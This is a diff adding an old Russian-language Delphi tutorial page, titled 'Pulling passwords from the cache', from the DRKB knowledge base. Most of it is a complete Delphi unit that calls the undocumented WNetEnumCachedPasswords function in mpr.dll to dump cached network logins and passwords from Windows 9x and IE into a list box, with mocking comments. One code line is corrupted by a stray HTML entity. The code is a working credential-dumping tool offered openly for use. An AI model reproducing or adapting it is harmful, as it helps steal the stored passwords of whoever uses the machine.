@@ -1,0 +1,154 @@
+<html>
+<head>
+  <title>Тянем пароли из кэша</title>
+  <meta http-equiv="Content-Type" content="text/html; charset=windows-1251" />
+  <link type="text/css" href="css/css.css" rel="stylesheet" />
+  <link type="text/css" href="css/sh.css" rel="stylesheet" />
+  <script language="javascript" src="js/shInit.js"></script>
+  <script language="javascript" src="js/shCore.js"></script>
+  <script language="javascript" src="js/shBrushDelphi.js"></script>
+  <script language="javascript" src="js/shBrushSql.js"></script>
+</head>
+<body>
+<div id="layout">
+<div id="header">
+  <div id="logo"><img id="logo" src="img/logo.png" /></div>
+  <div id="navigation">
+    <p id="navigation">
+      <a class="navigation" onclick="prev();" href="#">Предыдущая</a><br />
+      <a class="navigation" onclick="up();" href="#">Наверх</a><br />
+      <a class="navigation" onclick="next();" href="#">Следующая</a>
+    </p>
+  </div>
+</div>
+<div id="content">
+<div id="explorer">DRKB Explorer</div>
+  <h1 id="title">Тянем пароли из кэша</h1>
+<div id="date">01.01.2010</div>
+<!-- Actual content start -->
+Так, сегодня мы рассмотрим как можно взять кэшированные пароли из 9x винды, а также из винды, где в установленном виде есть 5-я иешка (хотя может и 4-ой хватит:) </p>
+<pre name="code" class="delphi">
+unit Unit1;
+ 
+interface
+ 
+uses
+  Windows, SysUtils, Classes, Forms, ShellAPI, Controls, StdCtrls;
+ 
+type
+    TForm1 = class(TForm)
+    GroupBox1: TGroupBox;
+    ListBox: TListBox;
+    Label1: TLabel;
+    Label2: TLabel;
+    procedure Label1Click(Sender: TObject);
+    procedure FormShow(Sender: TObject);
+  private
+    { Private declarations }
+  public
+    { Public declarations }
+    hMPR: THandle;
+end;
+ 
+// Отсюда мы можем заключить что должно валяться на форме,
+// надеюсь вы сами всё закидаете, а если нет, то вам дорога в хелпы.
+ 
+var
+  Form1: TForm1;
+ 
+const
+  Count: Integer = 0;
+ 
+function WNetEnumCachedPasswords(lp: lpStr; w: Word; b: Byte;
+PC: PChar; dw: DWord): Word; stdcall;
+ 
+implementation
+{$R *.DFM}
+ 
+function WNetEnumCachedPasswords(lp: lpStr; w: Word; b: Byte;
+PC: PChar; dw: DWord): Word; external mpr name 'WNetEnumCachedPasswords';
+ 
+// Объявляем функцию внешней, надеюсь вы поняли
+// каким макаром, или вам опять в хелпы
+ 
+type
+  PWinPassword = ^TWinPassword;
+  TWinPassword = record
+  EntrySize: Word;
+  ResourceSize: Word;
+  PasswordSize: Word;
+  EntryIndex: Byte;
+  EntryType: Byte;
+  PasswordC: Char;
+end;
+ 
+// Объявляем все типы, которые будем юзать в проге.
+ 
+var
+  WinPassword: TWinPassword;
+ 
+// Собственно переменные :-)
+ 
+function AddPassword(WinPassword: PWinPassword; dw: DWord): LongBool; stdcall;
+var
+  Password: string;
+  PC: array[0..$FF] of Char;
+begin
+  inc(Count);
+  // Увеличиваем число паролей на 1
+  Move(WinPassword.PasswordC, PC, WinPassword.ResourceSize);
+  // Получаем в PC пароль
+  PC[WinPassword.ResourceSize] := #0;
+  CharToOem(PC, PC);
+  Password := StrPas(PC);
+  // После недолгих преобразований в Password имеем кэшированный логин
+  Move(WinPassword.PasswordC, PC, WinPassword.PasswordSize + WinPassword.ResourceSize);
+  Move(PC[WinPassword.ResourceSize], PC, WinPassword.PasswordSize);
+  PC[WinPassword.PasswordSize] := #0;&lt; BR&gt; CharToOem(PC, PC);
+  // Теперь в PC имеем пароль
+  Password := Password + ': ' + StrPas(PC);
+  // Разделяем логин и пароль двуеточием...
+  Form1.ListBox.Items.Add(Password);
+  // ...и добавляем в ListBox на форме
+  Result := True;
+  // Возвращаемся с положительным результатом
+end;
+ 
+procedure TForm1.Label1Click(Sender: TObject);
+begin
+  // при нажатии на лэйбл открываем окошко ие с нашим любимым сайтом :-)
+  ShellExecute(GetDesktopWindow, 'open', 'http://www.lamerov.net', nil, nil, 0);
+end;
+ 
+procedure TForm1.FormShow(Sender: TObject);
+begin
+  // А теперь сама процедура заполнения всех паролей.
+  if WNetEnumCachedPasswords(nil, 0, $FF, @AddPassword, 0) &lt;&gt; 0 then
+  // Если не найден кэшированый пароль, то
+  begin
+    Application.MessageBox('Cant load passwords: User is not logon.',
+    'Error', mb_Ok or mb_IconWarning);
+    Application.Terminate;
+    // Выдаем сообщение об этом
+  end
+  // иначе,
+  else
+  if Count = 0 then
+    // если паролей всего 0 то тоже об этом сообщаем
+    ListBox.Items.Add('No passwords found...');
+end;
+ 
+end.
+</pre>
+<p>Вы наверное спросите: как же все таки дельфи попадает туда куда нам нужно, то есть на функцию обработки паролей и почемы она кэшит их всех, хотя функцию вызывали всего одни раз, а очень просто. Помните строку WNetEnumCachedPasswords(nil, 0, $FF, @AddPassword, 0) так вот она все и делает. Надеюсь вопросов не осталось. </p>
+<p><a href="http://delphiworld.narod.ru/" target="_blank">http://delphiworld.narod.ru/</a></p>
+<p>DelphiWorld 6.0</p>
+</div>
+<!-- Actual content end -->
+<hr />
+<div id="footer">
+<p>&copy; DRKB Library, 2010<br />Разработка и поддержка &mdash; <a href="http://www.drkb.ru/" target="_blank">Quadr0</a></p>
+</div>
+</div>
+</body>
+</html>
